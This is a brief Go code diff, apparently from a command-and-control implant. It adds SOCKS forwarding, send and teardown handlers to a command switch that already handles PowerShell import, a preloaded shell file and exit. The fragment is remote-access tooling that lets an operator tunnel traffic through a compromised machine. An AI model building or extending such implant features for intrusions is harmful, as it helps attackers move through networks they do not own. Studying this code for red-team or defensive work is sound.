@@ -172,6 +172,13 @@ func main() {
 									case packet.CMD_TYPE_PWSH_IMPORT:
 										// fmt.Printf("%x", cmdBuf)
 										packet.SetShellPreLoadedFile(cmdBuf)
+									case packet.CMD_TYPE_SOCKS_FWD:
+										finalPacket := packet.ParseSocksInitTraffic(cmdBuf)
+										resultBuf = append(resultBuf, finalPacket...)
+									case packet.CMD_TYPE_SOCKS_SEND:
+										packet.ParseSocksTraffic(cmdBuf)
+									case packet.CMD_TYPE_SOCKS_DIE:
+										packet.ParseSocksDie(cmdBuf)
 									case packet.CMD_TYPE_EXIT:
 										os.Exit(0)
 									default:
